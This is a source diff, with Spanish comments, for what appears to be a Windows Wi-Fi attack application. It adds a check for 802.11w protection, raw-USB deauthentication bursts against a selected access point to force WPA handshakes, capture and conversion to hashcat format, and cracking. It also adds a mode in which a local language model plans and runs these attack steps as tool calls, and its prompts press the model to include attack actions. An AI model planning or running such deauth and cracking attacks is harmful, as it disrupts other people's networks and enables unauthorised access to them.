@@ -102,6 +102,7 @@ function _paintConsole() {
 function _flushLog() {
   _logFlushQueued = false;
   _paintConsole();
+  queueScroll($('console-lines')); // consola única: mantener el scroll abajo
   const mini = $('mini-cv');
   if (mini && logLines.length && $('tab-scan')?.classList.contains('active')) {
     mini.textContent = logLines.slice(-3).join('\n');
@@ -139,6 +140,22 @@ window.addEventListener('error', (ev) => {
 window.addEventListener('unhandledrejection', (ev) => {
   try { log(`Promise rechazada: ${ev.reason}`, 'error'); } catch { /* noop */ }
 });
+
+// Consola única: un solo botón limpia/copia los tres flujos (verbose, historial e IA).
+window.clearAllConsoles = function () {
+  try { window.clearConsole(); } catch {}
+  try { window.clearLive(); } catch {}
+  try { if (window.iaConsoleClear) window.iaConsoleClear(); } catch {}
+  log('Consola única limpiada.', 'info');
+};
+window.copyAllConsoles = async function () {
+  const el = $('console-lines');
+  const txt = el ? (el.innerText || el.textContent || '') : '';
+  try {
+    await navigator.clipboard.writeText(txt);
+    log('[consola] Copiado todo (' + txt.length + ' chars)', 'ok');
+  } catch (e) { log('[consola] Error al copiar: ' + e, 'error'); }
+};
 
 window.clearConsole = function clearConsole() {
   logLines = [];
@@ -204,6 +221,7 @@ window.selectNetwork = function (bssid, ssid, signal, channel, security) {
   profileTarget(bssid);
   renderTargetBar();
   if (window.setIaStatus) window.setIaStatus('Objetivo seleccionado: ' + (ssid||'red') + ' · CH ' + (channel||'?') + '. Listo para atacar.');
+  void window.checkPmfGate(bssid, channel);
 
   window.showTab('attack');
 };
@@ -987,13 +1005,32 @@ window.scanAndAutoAttack = async function () {
 let _attackBusy = false;
 let _attackWatchdog = null;
 const ATTACK_BTN_SEL = '#tab-attack .atk-btn';
+const ATTACK_WATCHDOG_MS = 10 * 60 * 1000;
+
+// El watchdog NO debe dispararse mientras la UI espera la confirmación del
+// usuario (medido 2026-11-22: un modal abierto 35 min liberó el lock a los 10).
+function armAttackWatchdog() {
+  if (_attackWatchdog) clearTimeout(_attackWatchdog);
+  _attackWatchdog = setTimeout(() => {
+    if (window._attackAwaitingConfirm) {
+      log('Watchdog pausado: esperando confirmación del usuario; rearmando.', 'info');
+      armAttackWatchdog();
+      return;
+    }
+    log('Watchdog: ataque sin respuesta 10 min — liberando lock de UI.', 'warn');
+    currentAttackId = null;
+    setAttackRunning(false);
+  }, ATTACK_WATCHDOG_MS);
+}
 
 function setAttackRunning(on, label) {
   _attackBusy = !!on;
   if (_attackWatchdog) { clearTimeout(_attackWatchdog); _attackWatchdog = null; }
   const tab = document.getElementById('tab-attack');
   if (tab) tab.classList.toggle('attack-running', _attackBusy);
-  document.querySelectorAll(ATTACK_BTN_SEL).forEach(b => { b.disabled = _attackBusy; });
+  document.querySelectorAll(ATTACK_BTN_SEL).forEach(b => {
+    b.disabled = _attackBusy || (b.id === 'simple-attack-btn' && !!window._pmfBlocked);
+  });
   document.querySelectorAll('#tab-attack .atk-stop').forEach(b => { b.disabled = false; });
   const status = document.getElementById('attack-status-bar');
   if (status) {
@@ -1005,15 +1042,344 @@ function setAttackRunning(on, label) {
   }
   const scanBtn = document.getElementById('scanBtn');
   if (scanBtn) scanBtn.disabled = _attackBusy;
-  if (_attackBusy) {
-    _attackWatchdog = setTimeout(() => {
-      log('Watchdog: ataque sin respuesta 10 min — liberando lock de UI.', 'warn');
-      currentAttackId = null;
-      setAttackRunning(false);
-    }, 10 * 60 * 1000);
-  }
+  if (_attackBusy) armAttackWatchdog();
 }
 function attackIsBusy() { return _attackBusy; }
+
+// ── E0-20 fase 1: gate MFPC/MFPR (fail-closed) ─────────────────────────────
+// Un deauth sin protección contra un AP con PMF obligatorio se ignora. Antes
+// de atacar se capturan beacons del BSSID y se parsea el RSN IE. Si MFPR=1 o
+// no se puede confirmar, el botón Atacar QUEDA BLOQUEADO con motivo visible.
+window._pmfInfo = null;
+window._pmfBlocked = false;
+let _pmfCheckedFor = '';
+
+function applyPmfGate(note) {
+  const el = $('pmf-gate-note');
+  const btn = $('simple-attack-btn');
+  if (el) {
+    el.textContent = note;
+    el.style.color = window._pmfBlocked ? 'var(--orange, #e6b455)' : 'var(--muted)';
+  }
+  if (btn && !_attackBusy) {
+    btn.disabled = !!window._pmfBlocked;
+    btn.title = window._pmfBlocked ? (note || 'PMF: usa Kali') : '';
+  }
+}
+
+window.checkPmfGate = async function (bssid, channel) {
+  if (!bssid) { window._pmfBlocked = false; applyPmfGate(''); return true; }
+  const key = String(bssid).toUpperCase();
+  if (_pmfCheckedFor === key && window._pmfInfo) return !window._pmfBlocked;
+  _pmfCheckedFor = key;
+  window._pmfInfo = { mfpr: null, mfpc: null, beacons: 0, error: 'Comprobando PMF…' };
+  window._pmfBlocked = true;
+  applyPmfGate('Comprobando PMF (802.11w)…');
+  try {
+    const rep = await window.__invoke('detect_adapters');
+    const ad = ((rep && rep.adapters) || []).find(a => a.guid && (a.monitor_active || a.monitor_capable));
+    if (!ad) throw new Error('sin adaptador monitor/Npcap');
+    // El gate solo es fiable si la radio está en monitor y EN EL CANAL del objetivo.
+    const ch = parseInt(channel) || selectedChannel() || 0;
+    try {
+      const st = await window.__invoke('monitor_status', { ifaceGuid: ad.guid });
+      if (!st || !/monitor/i.test(st.mode || '')) {
+        const am = await window.__invoke('activate_monitor', { ifaceGuid: ad.guid, channel: ch || null });
+        if (!(am && am.success)) throw new Error((am && am.message) || 'no se pudo activar monitor');
+      }
+    } catch (e) { throw new Error('monitor: ' + e); }
+    if (ch >= 1 && ch <= 14) {
+      const cr = await window.__invoke('set_monitor_channel', { ifaceGuid: ad.guid, channel: ch });
+      if (!(cr && cr.success && parseInt(cr.channel) === ch)) {
+        throw new Error('monitor no movido al CH' + ch + ': ' + ((cr && cr.message) || 'sin confirmación'));
+      }
+    }
+    const cap = await window.__invoke('native_capture', { ifaceGuid: ad.guid, durationSecs: 6 });
+    if (!(cap && cap.success && cap.output_file)) throw new Error((cap && cap.message) || 'sin captura');
+    const info = await window.__invoke('parse_pmf', { pcapPath: cap.output_file, bssid: key });
+    window._pmfInfo = info;
+    if (info.mfpr === true) {
+      window._pmfBlocked = true;
+      applyPmfGate('⛔ PMF obligatorio (MFPR=1): el deauth sin protección no entra. Objetivo no atacable con la vía Windows actual.');
+      log('[PMF] MFPR=1 detectado en ' + key + ': deauth bloqueado (802.11w). Requiere vía PMF-aware (en investigación).', 'error');
+    } else if (info.mfpr === false) {
+      window._pmfBlocked = false;
+      applyPmfGate(info.mfpc ? '✓ PMF opcional (MFPC=1): deauth permitido.' : '✓ Sin PMF: deauth permitido.');
+      log('[PMF] ' + key + ': MFPC=' + (info.mfpc ? '1' : '0') + ' MFPR=0 · ' + info.beacons + ' beacon(s). Deauth permitido.', 'ok');
+    } else {
+      throw new Error(info.error || 'RSN no confirmado');
+    }
+  } catch (e) {
+    window._pmfBlocked = true;
+    applyPmfGate('⛔ No se pudo confirmar PMF: ' + String(e).slice(0, 90));
+    log('[PMF] No se pudo confirmar MFPC/MFPR de ' + key + ': ' + e + '. Fail-closed: objetivo no confirmado.', 'warn');
+  }
+  return !window._pmfBlocked;
+};
+
+// ── E0-18: Modo IA (tool-calling total) ─────────────────────────────────────
+// Dos modos separados, decididos por el usuario: OFF = flujo determinista
+// histórico; ON = SOLO la IA ejecuta, sin caída al determinista. Cada paso se
+// confirma en pantalla (iaConfirm interactivo en ia.js).
+const IA_MAX_STEPS = 12;
+
+window.setIaMode = function (on) {
+  window._iaMode = !!on;
+  const toggle = $('ia-mode-toggle'); if (toggle) toggle.checked = window._iaMode;
+  const lbl = $('ia-mode-label'); if (lbl) lbl.style.borderColor = window._iaMode ? 'var(--orange)' : '';
+  log(window._iaMode
+    ? 'Modo IA ACTIVADO: Atacar usará solo tool-calling de Ollama; cada paso exige confirmación.'
+    : 'Modo IA desactivado: Atacar usa el flujo determinista.', 'warn');
+  if (window.setIaStatus) window.setIaStatus(window._iaMode ? 'IA: modo tool-calling activo.' : 'Lista para atacar.');
+};
+
+window.iaAttack = async function () {
+  if (!claimAttack('ia_attack')) return;
+  setAttackRunning(true, 'IA: planificando ataque…');
+  window._simpleOrchestrating = true;
+  window._simpleStop = false;
+  window._autoStop = false;
+  showProgress(true);
+  updateProgress(2, 'Consultando a la IA…');
+  _liveBuf = '';
+  const lcv = $('live-cv'); if (lcv) lcv.textContent = '─ Logs en tiempo real (Modo IA) ─';
+  const stageEl = $('simple-stage');
+  const setStage = (t, pct) => {
+    if (stageEl) stageEl.textContent = t || '';
+    if (pct != null) updateProgress(pct, t || '');
+    if (t) log(`[etapa] ${t}`, 'info');
+  };
+  try {
+    let bssid = ($('attack-bssid')?.value || '').trim() || valOrEmpty($('ultra-bssid')?.value) || '';
+    let ssid = valOrEmpty($('ultra-ssid')?.value);
+    let n = lastNets.find(x => (x.bssid || '').toUpperCase() === bssid.toUpperCase()) || {};
+    let ch = parseInt(n.channel) || selectedChannel() || undefined;
+    const material = [ $('ultra-hash')?.value, $('crack-hash')?.value, $('convert-native-pcap')?.value ]
+      .map(v => valOrEmpty(v)).filter(Boolean).join(', ');
+    if (!bssid && !material) {
+      throw new Error('Sin objetivo y sin material (.22000/.pcap). Selecciona una red en Escanear o indica material; el Modo IA no busca objetivo por su cuenta.');
+    }
+    if (!window.__invoke) throw new Error('Puente Tauri no disponible.');
+    if (bssid && !(await window.checkPmfGate(bssid, ch))) return;
+
+    // El objetivo puede venir de un scan antiguo: profile_target lo rechaza si
+    // el BSSID no está en el último scan. Refrescamos el contexto ANTES de
+    // pedir el plan (esto no decide el ataque, solo actualiza los datos).
+    if (bssid && !n.bssid) {
+      log('[IA] Objetivo no visible en el último scan; reescaneando antes de planificar…', 'warn');
+      try {
+        const fresh = await window.__invoke('scan_wifi');
+        const nets = (fresh && fresh.networks) || [];
+        if (nets.length) { lastNets = [...nets]; syncTargetList(); }
+      } catch (e) { log('[IA] re-scan: ' + e, 'warn'); }
+      n = lastNets.find(x => (x.bssid || '').toUpperCase() === bssid.toUpperCase()) || {};
+      ch = parseInt(n.channel) || ch;
+    }
+    // El SSID debe venir del objetivo aunque no hiciera falta reescanear.
+    if (!ssid && n.ssid && !/oculta/i.test(n.ssid)) ssid = n.ssid;
+
+    setStage('Consultando plan a Ollama…', 10);
+    let adapters = [];
+    try { adapters = ((await window.__invoke('detect_adapters'))?.adapters) || []; } catch (e) { log('[IA] detect_adapters: ' + e, 'warn'); }
+    const guidList = adapters.filter(a => a.guid).map(a => a.guid).slice(0, 5).join(', ') || '(ninguno)';
+    const prompt = [
+      'Eres el orquestador de un ataque WiFi en laboratorio (redes propias).',
+      'Objetivo real — SSID: ' + (ssid || '?') + ' · BSSID: ' + (bssid || '?') + ' · canal: ' + (ch || '?'),
+      'Adaptadores detectados (GUID Npcap): ' + guidList,
+      'Material existente: ' + (material || '(ninguno)'),
+      'RESPONDE SOLO con bloques <tool_call>{"name":"nombre","arguments":{...}}</tool_call>, uno por herramienta, sin texto ni numeración.',
+      'Devuelve un plan COMPLETO de al menos 3 herramientas: NUNCA solo profile_target. El objetivo ya está validado en el último scan.',
+      'Usa únicamente los nombres de las funciones disponibles y argumentos JSON reales. Máximo ' + IA_MAX_STEPS + ' pasos.',
+      'No uses deauth ni WPS: Npcap no puede inyectar en Windows. No repitas pasos. Si hay material .22000, ve directo a inspeccionar/crackear. Termina con restore_managed si activaste monitor.',
+      'Para convert_pcap/inspect_hash/crack_hash puedes poner rutas de marcador de posición: el orquestador las sustituirá por los archivos reales generados en cada paso.',
+      'Si el objetivo es WPA2-PSK sin PMKID y no hay MFPR, incluye deauth_burst (RT3070 WinUSB) con el BSSID y canal reales para forzar un handshake.',
+    ].join('\n') + (window.iaMemoryContext ? await window.iaMemoryContext() : '');
+    const model = valOrEmpty($('ia-model')?.value) || null;
+    let plan = await window.__invoke('ollama_tools', { prompt, model });
+    if (!(plan && plan.success)) throw new Error('ollama_tools falló: ' + ((plan && plan.error) || 'sin respuesta'));
+    let steps = Array.isArray(plan.tool_calls) ? plan.tool_calls : [];
+    const ACTION_TOOLS = ['activate_monitor', 'capture_packets', 'crack_hash'];
+    const hasAction = () => steps.some(s => ACTION_TOOLS.includes(String((s && s.name) || '')));
+    if (steps.length < 2 || !hasAction()) {
+      log('[IA] Plan ' + (steps.length < 2 ? 'demasiado corto' : 'sin pasos de ataque') + ' (' + steps.length + ' pasos); repitiendo la consulta con instrucción más estricta…', 'warn');
+      const retry = prompt + '\nIMPORTANTE: tu plan debe incluir OBLIGATORIAMENTE activate_monitor y capture_packets (60 s) sobre el GUID del contexto, además de los pasos informativos. No devuelvas solo scan/detect/keygen.';
+      plan = await window.__invoke('ollama_tools', { prompt: retry, model });
+      if (plan && plan.success && Array.isArray(plan.tool_calls) && plan.tool_calls.length) steps = plan.tool_calls;
+    }
+    if (!steps.length) throw new Error('La IA no propuso herramientas válidas. Respuesta: ' + String(plan.response || '(vacía)').slice(0, 300));
+    if (!hasAction()) throw new Error('Plan sin pasos de ataque: la IA solo propuso consultas informativas. No se ejecutó nada.');
+    log(`[IA] Plan recibido: ${steps.length} herramienta(s) (modelo ${model || 'hermes3:8b'}).`, 'ok');
+    if (plan.response) log('[IA] ' + String(plan.response).slice(0, 500), 'info');
+
+    // La IA inventa rutas de marcador de posición (`/path/to/...`, `LAB.pcap`).
+    // Se sustituyen por los archivos REALES producidos por cada paso anterior.
+    const ctxPaths = { pcap: null, hash: null };
+    // El modelo deja marcadores (`?`, GUID vacío) en pasos posteriores. Se
+    // rellenan con los datos REALES del contexto antes de validar; es enlace
+    // de contexto, no una decisión del ataque.
+    const ctx = {
+      guid: (adapters.find(a => a.guid) || {}).guid || null,
+      bssid: bssid || null,
+      ssid: ssid || null,
+      channel: ch || null,
+    };
+    let okCount = 0, failCount = 0;
+    const total = Math.min(steps.length, IA_MAX_STEPS);
+    for (let i = 0; i < total; i++) {
+      if (window._simpleStop) throw new Error('cancelado');
+      const raw = steps[i] || {};
+      const name = String(raw.name || '');
+      const args = (raw.arguments && typeof raw.arguments === 'object') ? raw.arguments : {};
+      if (['activate_monitor', 'capture_packets', 'restore_managed'].includes(name) && ctx.guid) {
+        if (!args.iface_guid || !/^\{?[0-9a-fA-F-]{36}\}?$/.test(String(args.iface_guid))) {
+          args.iface_guid = ctx.guid;
+          log(`[IA] GUID real inyectado en ${name}.`, 'info');
+        }
+      }
+      if (name === 'activate_monitor' && (!args.channel || !Number.isInteger(args.channel)) && ctx.channel) args.channel = ctx.channel;
+      if ((name === 'keygen_detect' || name === 'crack_hash') && (!args.ssid || args.ssid === '?') && ctx.ssid) args.ssid = ctx.ssid;
+      if ((name === 'profile_target' || name === 'crack_hash') && (!args.bssid || args.bssid === '?') && ctx.bssid) args.bssid = ctx.bssid;
+      if (name === 'convert_pcap' && ctxPaths.pcap) args.pcap_path = ctxPaths.pcap;
+      if (name === 'inspect_hash' && ctxPaths.hash) args.hash_path = ctxPaths.hash;
+      if (name === 'crack_hash' && ctxPaths.hash) args.hash_file = ctxPaths.hash;
+      const v = window.iaValidateTool(name, args);
+      if (!v.ok) { log(`[IA] Paso ${i + 1}/${total} rechazado (${name}): ${v.error}`, 'warn'); failCount++; continue; }
+      let confirmMsg = `Paso ${i + 1}/${total}: ${name}\nArgumentos: ${JSON.stringify(args)}`;
+      if (name === 'deauth_burst') {
+        const tgt = lastNets.find(x => (x.bssid || '').toUpperCase() === String(args.bssid || '').toUpperCase()) || {};
+        confirmMsg = `Paso ${i + 1}/${total}: DEAUTH POR USB CRUDO (RT3070, RF real)\n` +
+          `BSSID: ${args.bssid} · SSID: ${tgt.ssid || '(desconocido)'} · CH ${args.channel}\n` +
+          `Clientes vistos: (no medido) · PMKID en beacons: (no medido)\n` +
+          `Se enviarán ${args.target_mac ? 6 : 8} frames en ráfagas de 2 a 100 ms (reason 7, 1 Mbps), con read-back de canal y watcher EAPOL.\n` +
+          `¿Ejecutar?`;
+      }
+      const approved = await window.iaConfirm(confirmMsg);
+      if (!approved) throw new Error('cancelado');
+      setStage(`IA → ${name}`, Math.round(15 + (i / total) * 75));
+      log(`[IA] Ejecutando ${name}…`, 'info');
+      let result;
+      try {
+        result = name === 'deauth_burst'
+          ? await window.iaDeauthBurst(args)
+          : await window.iaExecuteTool(name, args);
+        if (name === 'crack_hash') {
+          const done = await waitForAttack('crack_plan', 10 * 60 * 1000);
+          result = { ...(result || {}), finished: done ? (done.p || {}) : { success: false } };
+        }
+      } catch (e) {
+        log(`[IA] Error en ${name}: ${e}`, 'error');
+        failCount++;
+        continue;
+      }
+      okCount++;
+      log(`[IA] ${name} → ${JSON.stringify(result).slice(0, 400)}`, 'ok');
+      if (name === 'deauth_burst' && result && /\.22000$/i.test(result.output_file || '')) ctxPaths.hash = result.output_file;
+      const outFile = result && result.output_file;
+      if (typeof outFile === 'string' && outFile) {
+        if (/\.22000$/i.test(outFile)) ctxPaths.hash = outFile;
+        else if (/\.pcap(ng)?$/i.test(outFile)) ctxPaths.pcap = outFile;
+      }
+      if (name === 'detect_adapters' && result && Array.isArray(result.adapters)) {
+        const ad = result.adapters.find(a => a && a.guid);
+        if (ad) ctx.guid = ad.guid;
+      }
+    }
+    if (okCount === 0) {
+      setStage('Plan sin resultados', 0);
+      log(`[IA] Plan SIN RESULTADOS: ${okCount} paso(s) correcto(s), ${failCount} fallido(s)/rechazado(s). No se realizó ninguna acción útil.`, 'error');
+    } else {
+      setStage('Plan de IA terminado', 100);
+      log(`[IA] Plan terminado: ${okCount} paso(s) correcto(s), ${failCount} fallido(s)/rechazado(s).`, 'ok');
+    }
+  } catch (e) {
+    if (stageEl) stageEl.textContent = (String(e).includes('cancelado') || window._simpleStop) ? 'Detenido' : 'Plan rechazado';
+    updateProgress(0, stageEl ? stageEl.textContent : 'Fin');
+    if (String(e).includes('cancelado') || window._simpleStop) log('Modo IA detenido por el usuario.', 'warn');
+    else log('Modo IA: ' + e, 'error');
+  } finally {
+    window._simpleOrchestrating = false;
+    if (currentAttackId === 'ia_attack' || currentAttackId === 'crack_plan') currentAttackId = null;
+    setAttackRunning(false);
+    showProgress(false);
+    log('Modo IA finalizado.', 'warn');
+  }
+};
+
+// ── E0-20 fase 2: ráfaga deauth + watcher EAPOL ────────────────────────────
+window._eapolSeen = false;
+listen('eapol-detected', (ev) => {
+  try {
+    const d = ev.payload || {};
+    window._eapolSeen = true;
+    log('[EAPOL] ⚡Detectado de ' + (d.bssid || '?') + ' (' + (d.packets || 0) + ' paquetes). Deteniendo deauth para no romper M3/M4.', 'ok');
+  } catch {}
+}).catch(() => {});
+
+window.iaDeauthBurst = async function (args) {
+  const bssid = String(args.bssid || '').toUpperCase();
+  const ch = parseInt(args.channel) || selectedChannel() || 0;
+  const da = args.target_mac || null;
+  if (!bssid || !ch) throw new Error('deauth_burst sin BSSID/canal válido');
+  const rep = await window.__invoke('detect_adapters');
+  const ad = ((rep && rep.adapters) || []).find(a => a.guid && (a.monitor_active || a.monitor_capable));
+  if (!ad) throw new Error('sin adaptador monitor para la captura');
+  let monCh = null;
+  try { const st = await window.__invoke('monitor_status', { ifaceGuid: ad.guid }); monCh = st && parseInt(st.channel) || null; } catch {}
+  // Activar monitor y FIJAR el canal de verdad (medido: sin esto se transmite
+  // en CH4 y se escucha en CH1 → 0 EAPOL; sin monitor el watcher ve 0 paquetes).
+  try {
+    const am = await window.__invoke('activate_monitor', { ifaceGuid: ad.guid, channel: ch });
+    if (!(am && am.success)) log('[deauth] aviso activate_monitor: ' + ((am && am.message) || '?'), 'warn');
+  } catch (e) { log('[deauth] aviso activate_monitor: ' + e, 'warn'); }
+  try {
+    const sc = await window.__invoke('set_monitor_channel', { ifaceGuid: ad.guid, channel: ch });
+    if (!(sc && sc.success)) log('[deauth] aviso: no se pudo fijar el canal del monitor: ' + ((sc && sc.message) || '?'), 'warn');
+  } catch (e) { log('[deauth] aviso set_monitor_channel: ' + e, 'warn'); }
+  // Read-back del TX: abortar si el RT3070 no está en el canal del monitor.
+  const pf = await window.__invoke('usb_raw_tx_preflight', { channel: ch, monitor_channel: monCh });
+  if (!(pf && pf.ok)) throw new Error((pf && pf.message) || 'preflight TX falló');
+  log('[deauth] ' + (pf.message || 'preflight OK'), 'ok');
+
+  window._eapolSeen = false;
+  const watcher = window.__invoke('capture_until_eapol', { ifaceGuid: ad.guid, bssid, durationSecs: 45 });
+  // Medido 2026-11-22: el chip acepta 2 frames por proceso y luego hace
+  // backpressure; con un init por pasada salen 2/2 con TXDONE cada vez.
+  // 4 pasadas × 2 frames = 8 frames broadcast (o 5 dirigidos: 3×2).
+  const framesPerPass = 2;
+  const maxPasses = da ? 3 : 4;
+  let passes = 0;
+  while (!window._eapolSeen && passes < maxPasses) {
+    if (window._simpleStop) break;
+    try {
+      const ini = await window.__invoke('usb_raw_init', { channel: ch });
+      if (!(ini && ini.success)) log('[deauth] aviso init: ' + ((ini && ini.message) || '?'), 'warn');
+      const r = await window.__invoke('usb_raw_deauth', {
+        bssid, channel: ch, count: framesPerPass, target_mac: da, reason: 7, delay_ms: 100,
+      });
+      log('[deauth] pasada ' + (passes + 1) + '/' + maxPasses + ': ' + (r && r.message || 'sin respuesta'), (r && r.success) ? 'ok' : 'error');
+    } catch (e) { log('[deauth] error en pasada ' + (passes + 1) + ': ' + e, 'error'); }
+    passes++;
+    await new Promise(res => setTimeout(res, 1500));
+  }
+  const cap = await watcher;
+  if (!(cap && cap.success)) throw new Error((cap && cap.message) || 'watcher falló');
+  if (!cap.eapol) return { success: false, output_file: cap.output_file, pcapng: cap.output_file, message: cap.message, passes };
+  // Conversión + validación REAL: sin línea WPA*01/WPA*02 no hay material.
+  const conv = await window.__invoke('pcap_to_22000', { pcapPath: cap.output_file });
+  let total = 0;
+  if (conv && conv.success && conv.output_file) {
+    try { const ins = await window.__invoke('inspect_hash', { hashPath: conv.output_file }); total = parseInt(ins && ins.total) || 0; } catch {}
+  }
+  const ok = !!(conv && conv.success && total > 0);
+  return {
+    success: ok,
+    output_file: conv && conv.output_file || '',
+    pcapng: cap.output_file,
+    hashes: total,
+    passes,
+    message: ok ? '⚡ .22000 válido con ' + total + ' hash(es) + pcapng crudo guardado.' : 'EAPOL visto pero sin hash crackeable en la conversión (reintentar).',
+  };
+};
 
 // Reclama el id ANTES de lanzar el ataque. Si ya hay otro en curso NO se pisa
 // currentAttackId: si se pisara, el attack-completed del ataque real no haría
@@ -1591,6 +1957,12 @@ setTimeout(async () => {
     } catch (e) {
         console.error('Crack assets falló:', e);
     }
+    // E0-20 / D-07: avisar al arrancar si hashcat no tiene backend OpenCL.
+    try {
+        const cb = await window.__invoke('crack_backend_check');
+        window._crackBackend = cb;
+        if (cb && !cb.ready) log('[crack] ' + cb.message, 'warn');
+    } catch (e) { console.error('Preflight crack falló:', e); }
 }, 600);// AUTO-ATTACK MAESTRO
 // Ejecuta todos los ataques disponibles en secuencia contra un objetivo
 
@@ -1977,6 +2349,14 @@ window.simpleAttack = async function () {
       return;
     }
   }
+  // E0-20 fase 1: gate PMF antes de cualquier ataque con objetivo RF.
+  const pmfBssid = ($('attack-bssid')?.value || '').trim() || valOrEmpty($('ultra-bssid')?.value) || '';
+  if (pmfBssid && !(await window.checkPmfGate(pmfBssid, selectedChannel()))) return;
+
+  // E0-18: con el Modo IA activo, Atacar NO ejecuta el pipeline determinista.
+  // Es un modo exclusivo: si la IA falla, se informa y para (sin fallback).
+  if (window._iaMode) return window.iaAttack();
+
   window.setIaStatus('IA: analizando objetivo…');
   if (!claimAttack('simple_attack')) return;
   window._simpleOrchestrating = true;
